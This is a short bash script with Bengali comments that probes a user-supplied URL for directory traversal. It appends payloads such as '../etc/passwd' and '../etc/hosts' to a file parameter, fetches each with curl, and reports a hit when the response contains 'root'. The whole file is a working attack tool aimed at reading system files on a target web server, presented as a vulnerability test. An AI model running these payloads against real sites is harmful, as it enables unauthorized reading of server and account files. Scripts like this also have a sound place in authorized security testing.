#!/bin/bash

# ওয়েবসাইট URL ইনপুট নিন
echo "Enter Website URL for Directory Traversal Test (e.g., http://example.com/index.php?file=):"
read URL

# Directory Traversal পে-লোড
DIR_PAYLOADS=("../etc/passwd" "../etc/hosts" "../../etc/hostname")

for payload in "${DIR_PAYLOADS[@]}"
do
    # প্রতিটি প্যারামিটার দিয়ে টেস্ট করা
    TEST_URL="${URL}${payload}"
    RESPONSE=$(curl -s $TEST_URL)

    # যদি সিস্টেম ফাইলের কনটেন্ট দেখা যায়, Directory Traversal ভ্যালনারেবিলিটি থাকতে পারে
    if echo $RESPONSE | grep -q "root"; then
        echo "[+] Potential Directory Traversal vulnerability detected with payload: $payload"
    else
        echo "[-] No Directory Traversal vulnerability detected with payload: $payload"
    fi
done
